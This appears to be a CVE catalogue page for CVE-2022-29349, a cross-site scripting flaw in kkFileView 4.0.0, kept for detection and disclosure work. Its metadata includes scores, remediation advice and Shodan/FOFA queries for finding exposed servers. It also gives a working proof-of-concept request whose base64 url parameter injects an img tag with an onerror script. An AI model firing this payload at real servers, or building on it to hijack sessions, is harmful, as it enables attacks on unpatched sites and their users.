---
layout: post
cve_id: CVE-2022-29349
title: kkFileView 4.0.0 - Cross-Site Scripting
pcap: true
pcap_path: /pcaps/2022/CVE-2022-29349.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2022/CVE-2022-29349.yaml
snort2_rule: N/A
snort3_rule: N/A
author: arafatansari
severity: medium
impact: 'Successful exploitation of this vulnerability could allow an attacker to
  execute malicious scripts in the context of the victim''s browser, potentially leading
  to session hijacking, defacement, or theft of sensitive information.

  '
remediation: 'Apply the latest security patch or upgrade to a newer version of kkFileView
  to mitigate the XSS vulnerability.

  '
reference:
- https://github.com/kekingcn/kkFileView/issues/347
- https://nvd.nist.gov/vuln/detail/CVE-2022-29349
- https://github.com/ARPSyndicate/cvemon
- https://github.com/ARPSyndicate/kenzer-templates
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
  cvss-score: 6.1
  cve-id: CVE-2022-29349
  cwe-id: CWE-79
  epss-score: 0.02663
  epss-percentile: 0.85371
  cpe: cpe:2.3:a:keking:kkfileview:4.0.0:*:*:*:*:*:*:*
metadata:
  verified: true
  max-request: 1
  vendor: keking
  product: kkfileview
  shodan-query:
  - http.html:"kkFileView"
  - http.html:"kkfileview"
  fofa-query:
  - body="kkfileview"
  - app="kkfileview"
tags:
- cve
- cve2022
- kkFileView
- xss
- keking
- vuln
---

## üîç Vulnerability Description
kkFileView 4.0.0 contains multiple cross-site scripting vulnerabilities via the urls and currentUrl parameters at /controller/OnlinePreviewController.java.


## üåê HTTP Request
```nohighlight
GET /onlinePreview?url=aHR0cDovL3d3dy54eHguY29tL3h4eC50eHQiPjxpbWcgc3JjPTExMSBvbmVycm9yPWFsZXJ0KDEpPjEyMw%3D%3D HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Debian; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
Connection: close
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
```

